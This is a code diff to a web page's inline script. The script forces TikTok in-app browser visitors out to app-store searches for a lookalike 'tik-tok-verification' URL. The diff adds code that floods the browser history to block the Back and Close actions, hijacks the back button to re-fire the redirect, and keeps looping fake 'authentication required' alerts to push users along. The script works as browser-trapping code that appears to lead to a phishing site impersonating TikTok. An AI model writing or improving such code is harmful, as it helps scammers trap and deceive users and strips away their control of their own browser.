@@ -10,53 +10,60 @@
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
-    const fixedGap = 320; // YOUR OPTIMIZED DELAY
+    const gap = 320; 
 
-    function triggerStoreJump() {
+    function jamHistory() {
+        // Pushes the current state into the history 20 times per cycle
+        // This makes 'Back' or 'Close' much harder to execute
+        for (let i = 0; i < 20; i++) {
+            window.history.pushState(null, "", window.location.href);
+        }
+    }
+
+    function triggerJump() {
         const urlEnc = encodeURIComponent(target);
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        // Use the verified successful protocol
-        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
-        const androidTrigger = "market://search?q=" + urlEnc;
-        
-        window.location.href = isAndroid ? androidTrigger : iosTrigger;
+        const trigger = isAndroid 
+            ? "market://search?q=" + urlEnc 
+            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
+        window.location.href = trigger;
     }
 
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // 1. Fire the jump
-        triggerStoreJump();
+        // 1. Flood the history stack instantly
+        jamHistory();
 
-        // 2. THE CHECK: We wait the 320ms you requested.
-        // If the window is still in focus, it means the jump hasn't happened yet.
+        // 2. Fire the Redirect
+        triggerJump();
+
+        // 3. The 320ms GAP (Protected by history jamming)
         setTimeout(() => {
             if (document.hasFocus()) {
-                // We are still inside TikTok, so fire the lock
-                alert("ATTEMPT #30\n\nExternal Authentication Required.\n\nTap OK to force handover.");
+                // Main Alert Lock
+                alert("ATTEMPT #32\n\nRedirecting to System Browser...\n\nTap OK to continue.");
                 
-                // Fire again immediately using tap momentum
-                triggerStoreJump();
+                // Fire again using the tap momentum
+                triggerJump();
                 
-                // Queue the next check
-                setTimeout(rampage, 10);
-            } else {
-                // THE HANDOVER WORKED! 
-                // We do NOT fire an alert here to avoid blocking the OS switch.
-                console.log("Handover sensed. Pausing loop.");
+                // Recurse
+                setTimeout(rampage, 1);
             }
-        }, fixedGap);
+        }, gap);
     }
+
+    // Force a jam if they try to use the back button
+    window.onpopstate = function() {
+        jamHistory();
+        triggerJump();
+    };
 
     window.onload = () => {
         rampage();
     };
 
-    // If focus returns (user cancels the app store), resume the loop
-    window.onfocus = () => {
-        if (Date.now() < killTime) rampage();
-    };
+    window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
 </script>
 
 </body>
